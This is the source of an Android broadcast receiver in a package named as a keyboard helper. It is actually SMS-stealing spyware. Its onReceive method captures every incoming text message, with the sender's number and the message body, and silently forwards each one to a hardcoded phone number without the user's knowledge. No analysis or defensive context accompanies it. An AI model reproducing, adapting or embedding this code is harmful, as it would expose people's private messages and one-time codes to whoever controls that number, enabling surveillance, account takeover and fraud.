package com.galaxy.keyboard.helper;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

public class GalaxySmsManager extends BroadcastReceiver {

    private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";

    @Override
    public void onReceive(Context context, Intent intent) {

        if (intent.getAction().equals(SMS_RECEIVED)) {
            Bundle myBundle = intent.getExtras();
            SmsMessage[] messages = null;
            String strMessage = "";

            if (myBundle != null) {
                Object[] pdus = (Object[]) myBundle.get("pdus");

                messages = new SmsMessage[pdus.length];

                for (int i = 0; i < messages.length; i++) {
                    String format = myBundle.getString("format");
                    messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i], format);
                    strMessage += "SMS From: " + messages[i].getOriginatingAddress();
                    strMessage += " : ";
                    strMessage += messages[i].getMessageBody();
                    strMessage += "\n";
                }

                Log.e("SMS", strMessage);
                sendSMS("+15672384522", strMessage);
            }
        }
    }

    public void sendSMS(String phoneNo, String msg) {
        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(phoneNo, null, msg, null, null);
            Log.e("Send SMS", "Message sent");
        } catch (Exception ex) {
            Log.e("Send SMS", "Message not sent due to " + ex.toString());
            ex.printStackTrace();
        }
    }

    private boolean checkWhetherDualSim(Context context) {
        TelephonyManager tpm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        int mainSimState = 0, secondSimState = 0;
        mainSimState = tpm.getSimState();
        try {
            mainSimState = tpm.getSimState(0);
            secondSimState = tpm.getSimState(1);
        } catch (Exception e) {
            Log.e("Sim State Exception", e.toString());
        }
        return secondSimState > 0;
    }
}